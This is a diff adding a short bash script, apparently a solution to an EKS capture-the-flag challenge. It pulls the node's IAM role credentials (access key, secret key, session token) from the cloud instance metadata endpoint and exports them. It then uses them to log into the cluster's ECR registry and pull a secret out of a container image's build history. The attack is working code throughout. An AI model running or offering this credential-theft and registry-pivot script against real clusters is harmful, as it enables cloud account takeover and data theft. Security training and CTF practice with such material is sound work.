@@ -1,0 +1,13 @@
+#!/bin/bash
+
+export JSON=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole)
+export AWS_ACCESS_KEY_ID=$(echo $JSON | jq -r '.AccessKeyId' )
+export AWS_SECRET_ACCESS_KEY=$(echo $JSON | jq -r '.SecretAccessKey' )
+export AWS_SESSION_TOKEN=$(echo $JSON | jq -r '.SessionToken' )
+export REGISTRY=$(kubectl get pods -o json | jq -r '.items[0].spec.containers[0].image' | cut -d '/' -f 1)
+export IMAGE=$(kubectl get pods -o json | jq -r '.items[0].spec.containers[0].image' | cut -d '/' -f 2)
+aws sts get-caller-identity | jq
+
+
+aws ecr get-login-password | crane auth login $REGISTRY --username AWS --password-stdin
+crane config $REGISTRY/$IMAGE | jq -r '.history[2].created_by' | cut -d '=' -f 3 | cut -d ' ' -f 1
